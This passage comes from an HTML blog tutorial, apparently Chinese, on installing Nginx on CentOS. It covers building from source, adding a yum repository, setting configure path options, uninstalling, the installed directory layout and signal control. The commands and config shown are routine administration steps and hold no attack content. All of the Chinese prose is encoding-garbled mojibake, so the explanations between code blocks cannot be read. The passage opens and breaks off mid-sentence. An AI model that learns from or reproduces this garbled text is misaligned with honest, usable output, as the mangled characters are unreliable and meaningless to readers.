æ€§ã€‚åœ¨Nginxä¸­ï¼Œå¦‚æœæœåŠ¡å™¨éœ€è¦æä¾›å®‰å…¨ç½‘é¡µæ—¶å°±éœ€è¦ç”¨åˆ°OpenSSLåº“ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹OpenSSLçš„åº“æ–‡ä»¶åŠå®ƒçš„å¼€å‘å®‰è£…åŒ…è¿›è¡Œä¸€ä¸ªå®‰è£…ã€‚</p><p>å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>yum install -y openssl openssl-devel</code>æ¥è¿›è¡Œå®‰è£…</p><p>å®‰è£…æˆåŠŸåï¼Œå¯ä»¥é€šè¿‡<code>rpm -qa openssl openssl-devel</code>æ¥æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><p>ä¸Šè¿°å‘½ä»¤ï¼Œä¸€ä¸ªä¸ªæ¥çš„è¯æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸€æ¡å‘½ä»¤æ¥è¿›è¡Œå®‰è£…</p><p><code>yum install -y gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel</code>è¿›è¡Œå…¨éƒ¨å®‰è£…ã€‚</p><h4 id="æ–¹æ¡ˆä¸€nginxçš„æºç ç®€å•å®‰è£…"><a class="markdownIt-Anchor" href="#æ–¹æ¡ˆä¸€nginxçš„æºç ç®€å•å®‰è£…"></a> æ–¹æ¡ˆä¸€ï¼šNginxçš„æºç ç®€å•å®‰è£…</h4><p>(1)è¿›å…¥å®˜ç½‘æŸ¥æ‰¾éœ€è¦ä¸‹è½½ç‰ˆæœ¬çš„é“¾æ¥åœ°å€ï¼Œç„¶åä½¿ç”¨wgetå‘½ä»¤è¿›è¡Œä¸‹è½½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>nginx.org<span class="hljs-regexp">/download/</span>nginx-<span class="hljs-number">1.16</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>(2)å»ºè®®å¤§å®¶å°†ä¸‹è½½çš„èµ„æºè¿›è¡ŒåŒ…ç®¡ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p nginx/core<br><span class="hljs-built_in">mv</span> nginx-1.16.1.tar.gz nginx/core<br></code></pre></td></tr></table></figure><p>(3)è§£å‹ç¼©</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -xzf nginx-<span class="hljs-number">1</span>.<span class="hljs-number">16</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>(4)è¿›å…¥èµ„æºæ–‡ä»¶ä¸­ï¼Œå‘ç°configure</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./configure<br></code></pre></td></tr></table></figure><p>(5)ç¼–è¯‘</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>(6)å®‰è£…</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h4 id="æ–¹æ¡ˆäºŒyumå®‰è£…"><a class="markdownIt-Anchor" href="#æ–¹æ¡ˆäºŒyumå®‰è£…"></a> æ–¹æ¡ˆäºŒï¼šyumå®‰è£…</h4><p>ä½¿ç”¨æºç è¿›è¡Œç®€å•å®‰è£…ï¼Œæˆ‘ä»¬ä¼šå‘ç°å®‰è£…çš„è¿‡ç¨‹æ¯”è¾ƒç¹çï¼Œéœ€è¦æå‰å‡†å¤‡GCCç¼–è¯‘å™¨ã€PCREå…¼å®¹æ­£åˆ™è¡¨è¾¾å¼åº“ã€zlibå‹ç¼©åº“ã€OpenSSLå®‰å…¨é€šä¿¡çš„è½¯ä»¶åº“åŒ…ï¼Œç„¶åæ‰èƒ½è¿›è¡ŒNginxçš„å®‰è£…ã€‚</p><p>ï¼ˆ1ï¼‰å®‰è£…yum-utils</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum  <span class="hljs-keyword">install</span> -y yum-utils<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ·»åŠ yumæºæ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/yum</span>.repos.d/nginx.repo<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[nginx-stable]</span><br><span class="hljs-attr">name</span>=nginx stable repo<br><span class="hljs-attr">baseurl</span>=http://nginx.org/packages/centos/<span class="hljs-variable">$releasever</span>/<span class="hljs-variable">$basearch</span>/<br><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">enabled</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">gpgkey</span>=https://nginx.org/keys/nginx_signing.key<br><span class="hljs-attr">module_hotfixes</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-section">[nginx-mainline]</span><br><span class="hljs-attr">name</span>=nginx mainline repo<br><span class="hljs-attr">baseurl</span>=http://nginx.org/packages/mainline/centos/<span class="hljs-variable">$releasever</span>/<span class="hljs-variable">$basearch</span>/<br><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">enabled</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">gpgkey</span>=https://nginx.org/keys/nginx_signing.key<br><span class="hljs-attr">module_hotfixes</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">yum list <span class="hljs-string">| grep nginx</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581416861684.png" alt="1581416861684" /></p><p>ï¼ˆ4ï¼‰ä½¿ç”¨yumè¿›è¡Œå®‰è£…</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo  yum <span class="hljs-keyword">install</span> -y nginx<br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰æŸ¥çœ‹nginxçš„å®‰è£…ä½ç½®</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">whereis nginx</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581416981939.png" alt="1581416981939" /></p><p>ï¼ˆ6ï¼‰å¯åŠ¨æµ‹è¯•</p><h4 id="æºç ç®€å•å®‰è£…å’Œyumå®‰è£…çš„å·®å¼‚"><a class="markdownIt-Anchor" href="#æºç ç®€å•å®‰è£…å’Œyumå®‰è£…çš„å·®å¼‚"></a> æºç ç®€å•å®‰è£…å’Œyumå®‰è£…çš„å·®å¼‚ï¼š</h4><p>è¿™é‡Œå…ˆä»‹ç»ä¸€ä¸ªå‘½ä»¤: <code>./nginx -V</code>,é€šè¿‡è¯¥å‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ°æ‰€å®‰è£…Nginxçš„ç‰ˆæœ¬åŠç›¸å…³é…ç½®ä¿¡æ¯ã€‚</p><p>ç®€å•å®‰è£…</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586016586042.png" alt="1586016586042" /></p><p>yumå®‰è£…</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586016605581.png" alt="1586016605581" /></p><h5 id="è§£å‹nginxç›®å½•"><a class="markdownIt-Anchor" href="#è§£å‹nginxç›®å½•"></a> è§£å‹Nginxç›®å½•</h5><p>æ‰§è¡Œ<code>tar -zxvf nginx-1.16.1.tar.gz</code>å¯¹ä¸‹è½½çš„èµ„æºè¿›è¡Œè§£å‹ç¼©ï¼Œè¿›å…¥å‹ç¼©åçš„ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç»“æ„</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581421319232.png" alt="1581421319232" /></p><p>å†…å®¹è§£é‡Šï¼š</p><p>auto:å­˜æ”¾çš„æ˜¯ç¼–è¯‘ç›¸å…³çš„è„šæœ¬</p><p>CHANGES:ç‰ˆæœ¬å˜æ›´è®°å½•</p><p><a href="http://CHANGES.ru">CHANGES.ru</a>:ä¿„ç½—æ–¯æ–‡çš„ç‰ˆæœ¬å˜æ›´è®°å½•</p><p>conf:nginxé»˜è®¤çš„é…ç½®æ–‡ä»¶</p><p>configure:nginxè½¯ä»¶çš„è‡ªåŠ¨è„šæœ¬ç¨‹åº,æ˜¯ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„æ–‡ä»¶ï¼Œä½œç”¨å¦‚ä¸‹ï¼š</p><p>â€‹ï¼ˆ1ï¼‰æ£€æµ‹ç¯å¢ƒåŠæ ¹æ®ç¯å¢ƒæ£€æµ‹ç»“æœç”ŸæˆCä»£ç </p><p>â€‹ï¼ˆ2ï¼‰ç”Ÿæˆç¼–è¯‘ä»£ç éœ€è¦çš„Makefileæ–‡ä»¶</p><p>contrib:å­˜æ”¾çš„æ˜¯å‡ ä¸ªç‰¹æ®Šçš„è„šæœ¬æ–‡ä»¶ï¼Œå…¶ä¸­READMEä¸­å¯¹è„šæœ¬æœ‰ç€è¯¦ç»†çš„è¯´æ˜</p><p>html:å­˜æ”¾çš„æ˜¯Nginxè‡ªå¸¦çš„ä¸¤ä¸ªhtmlé¡µé¢ï¼Œè®¿é—®Nginxçš„é¦–é¡µå’Œé”™è¯¯é¡µé¢</p><p>LICENSE:è®¸å¯è¯çš„ç›¸å…³æè¿°æ–‡ä»¶</p><p>man:nginxçš„manæ‰‹å†Œ</p><p>README:Nginxçš„é˜…è¯»æŒ‡å—</p><p>src:Nginxçš„æºä»£ç </p><h4 id="æ–¹æ¡ˆä¸‰nginxçš„æºç å¤æ‚å®‰è£…"><a class="markdownIt-Anchor" href="#æ–¹æ¡ˆä¸‰nginxçš„æºç å¤æ‚å®‰è£…"></a> æ–¹æ¡ˆä¸‰:Nginxçš„æºç å¤æ‚å®‰è£…</h4><p>è¿™ç§æ–¹å¼å’Œç®€å•çš„å®‰è£…é…ç½®ä¸åŒçš„åœ°æ–¹åœ¨ç¬¬ä¸€æ­¥ï¼Œé€šè¿‡<code>./configure</code>æ¥å¯¹ç¼–è¯‘å‚æ•°è¿›è¡Œè®¾ç½®ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥æŒ‡å®šã€‚é‚£ä¹ˆéƒ½æœ‰å“ªäº›å‚æ•°å¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œä¸€ä¸ªè¯¦ç»†çš„è¯´æ˜ã€‚</p><p>PATH:æ˜¯å’Œè·¯å¾„ç›¸å…³çš„é…ç½®ä¿¡æ¯</p><p>with:æ˜¯å¯åŠ¨æ¨¡å—ï¼Œé»˜è®¤æ˜¯å…³é—­çš„</p><p>without:æ˜¯å…³é—­æ¨¡å—ï¼Œé»˜è®¤æ˜¯å¼€å¯çš„</p><p>æˆ‘ä»¬å…ˆæ¥è®¤è¯†ä¸€äº›ç®€å•çš„è·¯å¾„é…ç½®å·²ç»é€šè¿‡è¿™äº›é…ç½®æ¥å®Œæˆä¸€ä¸ªç®€å•çš„ç¼–è¯‘ï¼š</p><p>â€“prefix=PATH</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">æŒ‡å‘Nginxçš„å®‰è£…ç›®å½•ï¼Œé»˜è®¤å€¼ä¸º<span class="hljs-regexp">/usr/</span>local/nginx   <br></code></pre></td></tr></table></figure><p>â€“sbin-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">æŒ‡å‘(æ‰§è¡Œ)ç¨‹åºæ–‡ä»¶(nginx)çš„è·¯å¾„,é»˜è®¤å€¼ä¸º&lt;prefix&gt;<span class="hljs-regexp">/sbin/</span>nginx<br></code></pre></td></tr></table></figure><p>â€“modules-path=PATH</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">æŒ‡å‘<span class="hljs-type">NginxåŠ¨æ€æ¨¡å—å®‰è£…ç›®å½•ï¼Œé»˜è®¤å€¼ä¸º</span>&lt;<span class="hljs-keyword">prefix</span>&gt;<span class="hljs-operator">/</span>modules<br></code></pre></td></tr></table></figure><p>â€“conf-path=PATH</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">æŒ‡å‘é…ç½®æ–‡ä»¶(nginx.<span class="hljs-keyword">conf</span>)çš„è·¯å¾„,é»˜è®¤å€¼ä¸º<span class="hljs-symbol">&lt;prefix&gt;</span>/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>â€“error-log-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">æŒ‡å‘é”™è¯¯æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„,é»˜è®¤å€¼ä¸º&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>error.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>â€“http-log-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">æŒ‡å‘è®¿é—®æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„,é»˜è®¤å€¼ä¸º&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>â€“pid-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">æŒ‡å‘Nginxå¯åŠ¨åè¿›è¡ŒIDçš„æ–‡ä»¶è·¯å¾„ï¼Œé»˜è®¤å€¼ä¸º&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>nginx.pid<br></code></pre></td></tr></table></figure><p>â€“lock-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">æŒ‡å‘Nginxé”æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„,é»˜è®¤å€¼ä¸º&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>nginx.lock<br></code></pre></td></tr></table></figure><p>è¦æƒ³ä½¿ç”¨å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>nginx \<br>--sbin-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx \<br>--modules-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/m</span>odules \<br>--conf-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf \<br>--error-log-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/error.log \<br>--http-log-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/access.log \<br>--pid-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/nginx.pid \<br>--lock-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/nginx.lock<br></code></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨ä¸Šè¿°å‘½ä»¤ä¹‹å‰ï¼Œéœ€è¦å°†ä¹‹å‰æœåŠ¡å™¨å·²ç»å®‰è£…çš„nginxè¿›è¡Œå¸è½½ï¼Œå¸è½½çš„æ­¥éª¤åˆ†ä¸ºä¸‰æ­¥éª¤ï¼š</p><p>æ­¥éª¤ä¸€ï¼šéœ€è¦å°†nginxçš„è¿›ç¨‹å…³é—­</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">./nginx -s stop<br></code></pre></td></tr></table></figure><p>æ­¥éª¤äºŒ:å°†å®‰è£…çš„nginxè¿›è¡Œåˆ é™¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -rf <span class="hljs-regexp">/usr/</span>local/nginx<br></code></pre></td></tr></table></figure><p>æ­¥éª¤ä¸‰:å°†å®‰è£…åŒ…ä¹‹å‰ç¼–è¯‘çš„ç¯å¢ƒæ¸…é™¤æ‰</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span><br></code></pre></td></tr></table></figure><h4 id="æ–¹æ¡ˆå››å®å¡”å®‰è£…"><a class="markdownIt-Anchor" href="#æ–¹æ¡ˆå››å®å¡”å®‰è£…"></a> æ–¹æ¡ˆå››:å®å¡”å®‰è£…</h4><p>åœ¨å®å¡”é¢æ¿é€‰æ‹©å®‰è£…ã€‚æ²¡æœ‰å°è¯•åé¢çš„æ¨¡å—æ·»åŠ ã€‚ä½†æ˜¯ä¹Ÿæœ‰äº›æ¨¡å—å®å¡”é»˜è®¤å¸®æˆ‘ä»¬æ·»åŠ äº†ã€‚</p><h3 id="nginxç›®å½•ç»“æ„åˆ†æ"><a class="markdownIt-Anchor" href="#nginxç›®å½•ç»“æ„åˆ†æ"></a> Nginxç›®å½•ç»“æ„åˆ†æ</h3><p>åœ¨ä½¿ç”¨Nginxä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¯¹å®‰è£…å¥½çš„Nginxç›®å½•æ–‡ä»¶è¿›è¡Œä¸€ä¸ªåˆ†æï¼Œåœ¨è¿™å—ç»™å¤§å®¶ä»‹ç»ä¸€ä¸ªå·¥å…·treeï¼Œé€šè¿‡treeæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹é¢çš„å»æŸ¥çœ‹centosç³»ç»Ÿä¸Šçš„æ–‡ä»¶ç›®å½•ç»“æ„ï¼Œå½“ç„¶ï¼Œå¦‚æœæƒ³ä½¿ç”¨treeå·¥å…·ï¼Œå°±å¾—å…ˆé€šè¿‡<code>yum install -y tree</code>æ¥è¿›è¡Œå®‰è£…ï¼Œå®‰è£…æˆåŠŸåï¼Œå¯ä»¥é€šè¿‡æ‰§è¡Œ<code>tree /usr/local/nginx</code>(treeåé¢è·Ÿçš„æ˜¯Nginxçš„å®‰è£…ç›®å½•)ï¼Œè·å–çš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581439634265.png" alt="1581439634265" /></p><p>conf:nginxæ‰€æœ‰é…ç½®æ–‡ä»¶ç›®å½•</p><p>â€‹    CGI(Common Gateway Interface)é€šç”¨ç½‘å…³ã€æ¥å£ã€‘ï¼Œä¸»è¦è§£å†³çš„é—®é¢˜æ˜¯ä»å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªè¯·æ±‚å’Œæ•°æ®ï¼ŒæœåŠ¡ç«¯è·å–åˆ°è¯·æ±‚å’Œæ•°æ®åå¯ä»¥è°ƒç”¨è°ƒç”¨CGIã€ç¨‹åºã€‘å¤„ç†åŠç›¸åº”ç»“æœç»™å®¢æˆ·ç«¯çš„ä¸€ç§æ ‡å‡†è§„èŒƒã€‚</p><p>â€‹fastcgi.conf:fastcgiç›¸å…³é…ç½®æ–‡ä»¶</p><p>â€‹fastcgi.conf.default:fastcgi.confçš„å¤‡ä»½æ–‡ä»¶</p><p>â€‹fastcgi_params:fastcgiçš„å‚æ•°æ–‡ä»¶</p><p>â€‹fastcgi_params.default:fastcgiçš„å‚æ•°å¤‡ä»½æ–‡ä»¶</p><p>â€‹scgi_params:scgiçš„å‚æ•°æ–‡ä»¶</p><p>â€‹scgi_params.defaultï¼šscgiçš„å‚æ•°å¤‡ä»½æ–‡ä»¶</p><p>â€‹    uwsgi_params:uwsgiçš„å‚æ•°æ–‡ä»¶</p><p>â€‹uwsgi_params.default:uwsgiçš„å‚æ•°å¤‡ä»½æ–‡ä»¶</p><p>â€‹mime.types:è®°å½•çš„æ˜¯HTTPåè®®ä¸­çš„Content-Typeçš„å€¼å’Œæ–‡ä»¶åç¼€åçš„å¯¹åº”å…³ç³»</p><p>â€‹mime.types.default:mime.typesçš„å¤‡ä»½æ–‡ä»¶</p><p>â€‹nginx.conf:è¿™ä¸ªæ˜¯Nginxçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶éå¸¸é‡è¦ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å³å°†è¦å­¦ä¹ çš„é‡ç‚¹</p><p>â€‹nginx.conf.default:nginx.confçš„å¤‡ä»½æ–‡ä»¶</p><p>â€‹koi-utfã€koi-winã€win-utfè¿™ä¸‰ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸ç¼–ç è½¬æ¢æ˜ å°„ç›¸å…³çš„é…ç½®æ–‡ä»¶ï¼Œç”¨æ¥å°†ä¸€ç§ç¼–ç è½¬æ¢æˆå¦ä¸€ç§ç¼–ç </p><p>html:å­˜æ”¾nginxè‡ªå¸¦çš„ä¸¤ä¸ªé™æ€çš„htmlé¡µé¢</p><p>â€‹50x.html:è®¿é—®å¤±è´¥åçš„å¤±è´¥é¡µé¢</p><p>â€‹index.html:æˆåŠŸè®¿é—®çš„é»˜è®¤é¦–é¡µ</p><p>logs:è®°å½•å…¥é—¨çš„æ–‡ä»¶ï¼Œå½“nginxæœåŠ¡å™¨å¯åŠ¨åï¼Œè¿™é‡Œé¢ä¼šæœ‰ access.log error.log å’Œnginx.pidä¸‰ä¸ªæ–‡ä»¶å‡ºç°ã€‚</p><p>sbin:æ˜¯å­˜æ”¾æ‰§è¡Œç¨‹åºæ–‡ä»¶nginx</p><p>â€‹nginxæ˜¯ç”¨æ¥æ§åˆ¶Nginxçš„å¯åŠ¨å’Œåœæ­¢ç­‰ç›¸å…³çš„å‘½ä»¤ã€‚</p><h4 id=""><a class="markdownIt-Anchor" href="#"></a> </h4><h3 id="nginxæœåŠ¡å™¨å¯åœå‘½ä»¤"><a class="markdownIt-Anchor" href="#nginxæœåŠ¡å™¨å¯åœå‘½ä»¤"></a> NginxæœåŠ¡å™¨å¯åœå‘½ä»¤</h3><p>Nginxå®‰è£…å®Œæˆåï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å­¦ä¹ çš„æ˜¯å¦‚ä½•å¯åŠ¨ã€é‡å¯å’Œåœæ­¢Nginxçš„æœåŠ¡ã€‚</p><p>å¯¹äºNginxçš„å¯åœåœ¨linuxç³»ç»Ÿä¸­ä¹Ÿæœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œæˆ‘ä»¬æœ¬æ¬¡è¯¾ç¨‹ä»‹ç»ä¸¤ç§æ–¹å¼ï¼š</p><ol><li><p>NginxæœåŠ¡çš„ä¿¡å·æ§åˆ¶</p></li><li><p>Nginxçš„å‘½ä»¤è¡Œæ§åˆ¶</p></li></ol><h4 id="æ–¹å¼ä¸€nginxæœåŠ¡çš„ä¿¡å·æ§åˆ¶"><a class="markdownIt-Anchor" href="#æ–¹å¼ä¸€nginxæœåŠ¡çš„ä¿¡å·æ§åˆ¶"></a> æ–¹å¼ä¸€:NginxæœåŠ¡çš„ä¿¡å·æ§åˆ¶</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Nginxä¸­çš„<span class="hljs-literal">master</span>å’Œworkerè¿›ç¨‹?<br>Nginxçš„å·¥ä½œæ–¹å¼?<br>å¦‚ä½•è·å–è¿›ç¨‹çš„PID?<br>ä¿¡å·æœ‰å“ªäº›?<br>å¦‚ä½•é€šè¿‡ä¿¡å·æ§åˆ¶Nginxçš„å¯åœç­‰ç›¸å…³æ“ä½œ?<br></code></pre></td></tr></table></figure><p>å‰é¢åœ¨æåˆ°Nginxçš„é«˜æ€§èƒ½ï¼Œå…¶å®ä¹Ÿå’Œå®ƒçš„æ¶æ„æ¨¡å¼æœ‰å…³ã€‚Nginxé»˜è®¤é‡‡ç”¨çš„æ˜¯å¤šè¿›ç¨‹çš„æ–¹å¼æ¥å·¥ä½œçš„ï¼Œå½“å°†Nginxå¯åŠ¨åï¼Œæˆ‘ä»¬é€šè¿‡<code>ps -ef | grep nginx</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581444289294.png" alt="1581444289294" /></p><p>ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°,Nginxåå°è¿›ç¨‹ä¸­åŒ…å«ä¸€ä¸ªmasterè¿›ç¨‹å’Œå¤šä¸ªworkerè¿›ç¨‹ï¼Œmasterè¿›ç¨‹ä¸»è¦ç”¨æ¥ç®¡ç†workerè¿›ç¨‹ï¼ŒåŒ…å«æ¥æ”¶å¤–ç•Œçš„ä¿¡æ¯ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„ä¿¡å·å‘é€ç»™å„ä¸ªworkerè¿›ç¨‹ï¼Œç›‘æ§workerè¿›ç¨‹çš„çŠ¶æ€ï¼Œå½“workerè¿›ç¨‹å‡ºç°å¼‚å¸¸é€€å‡ºåï¼Œä¼šè‡ªåŠ¨é‡æ–°å¯åŠ¨æ–°çš„workerè¿›ç¨‹ã€‚è€Œworkerè¿›ç¨‹åˆ™æ˜¯ä¸“é—¨ç”¨æ¥å¤„ç†ç”¨æˆ·è¯·æ±‚çš„ï¼Œå„ä¸ªworkerè¿›ç¨‹ä¹‹é—´æ˜¯å¹³ç­‰çš„å¹¶ä¸”ç›¸äº’ç‹¬ç«‹ï¼Œå¤„ç†è¯·æ±‚çš„æœºä¼šä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚nginxçš„è¿›ç¨‹æ¨¡å‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹å›¾æ¥è¯´æ˜ä¸‹ï¼š</p><p><img src="F:%5C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%5C%E7%AC%94%E8%AE%B0%5Cassets%5C1581444603231.png" alt="1581444603231" /></p><p>æˆ‘ä»¬ç°åœ¨ä½œä¸ºç®¡ç†å‘˜ï¼Œåªéœ€è¦é€šè¿‡ç»™masterè¿›ç¨‹å‘é€ä¿¡å·å°±å¯ä»¥æ¥æ§åˆ¶Nginx,è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦æœ‰ä¸¤ä¸ªå‰ææ¡ä»¶ï¼Œä¸€ä¸ªæ˜¯è¦æ“ä½œçš„masterè¿›ç¨‹ï¼Œä¸€ä¸ªæ˜¯ä¿¡å·ã€‚</p><p>ï¼ˆ1ï¼‰è¦æƒ³æ“ä½œNginxçš„masterè¿›ç¨‹ï¼Œå°±éœ€è¦è·å–åˆ°masterè¿›ç¨‹çš„è¿›ç¨‹å·IDã€‚è·å–æ–¹å¼ç®€å•ä»‹ç»ä¸¤ä¸ªï¼Œ</p><p>æ–¹å¼ä¸€ï¼šé€šè¿‡<code>ps -ef | grep 